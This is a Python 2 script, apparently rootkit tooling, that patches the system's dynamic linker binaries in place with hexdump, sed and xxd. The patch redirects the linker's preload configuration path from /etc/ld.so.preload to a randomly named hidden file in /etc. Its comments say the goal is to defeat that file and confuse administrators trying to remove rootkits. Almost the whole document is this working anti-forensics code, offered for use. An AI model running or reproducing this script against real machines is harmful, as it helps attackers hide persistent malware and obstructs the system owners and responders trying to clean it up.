#!/usr/bin/python2

# modifies the dynamic linker and changes the target location of /etc/ld.so.preload to a random file in /etc/
# this means that ld.so.preload will no longer make a difference, and it'll confuse the fuck out of sysadmins trying to remove any rootkits on their box

# this python script is based off of http://everydaywithlinux.blogspot.co.uk/2012/11/patch-strings-in-binary-files-with-sed.html

import os
import sys
import random
import string
import subprocess

LIB_DIRS = ["/lib/", "/lib32/", "/lib64/", "/libx32/"]

O_PRELOAD = "/etc/ld.so.preload"
N_PRELOAD = "{0}".format("/etc/.{0}".format(''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for x in range(10))))

PYL = """hexdump -ve '1/1 "%.2X"' {0} | sed "s/{1}/{2}/g" | xxd -r -p > {0}.tmp
chmod --reference {0} {0}.tmp
mv {0}.tmp {0}"""

if len(N_PRELOAD) > len(O_PRELOAD):
	print("New ld.so.preload location needs to be the same length or smaller as the original location. ({0} chars)".format(strlen(O_PRELOAD)))
	quit()

def hex_str(_):
	return _.encode("hex").upper() + "00"

def patch_lib(location):
	print("Attempting to patch {0} by replacing {1} with new string, {2}".format(location, O_PRELOAD, N_PRELOAD))
	p = subprocess.Popen(["strings", location], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	out, err = p.communicate()
	for x in out.split("\n"):
		if x == "/etc/ld.so.preload":
			print("ld.so.preload found in {0}: {1}".format(location, x))

			o_preload_hex = hex_str(O_PRELOAD)
			n_preload_hex = hex_str(N_PRELOAD)

			while(len(n_preload_hex) <> len(o_preload_hex)):
				print("Padding the new preload location with nullbytes so that it is the same length.")
				n_preload_hex += "00"

			print("Replacing {0} with {1} in library {2}".format(O_PRELOAD, N_PRELOAD, location))
			os.system(PYL.format(location, o_preload_hex, n_preload_hex))
			print("{0} patched.".format(location))


def get_ld_locations():
	lib_locations = ""
	for _ in LIB_DIRS:
		if os.path.exists(_):
			for x in os.listdir(_):
				if x.startswith("ld-"):
					lib_locations += "{0}{1}\n".format(_, x)
	return lib_locations

def main(libs):
	for x in libs:
		if os.path.isfile(x):
			patch_lib(x)

if __name__ == "__main__":
	locations = get_ld_locations()[:-1]

	for x in locations.split("\n"):
		patch_lib(x)

	f = open("new_preload", "w")
	f.write(N_PRELOAD)
	f.close()
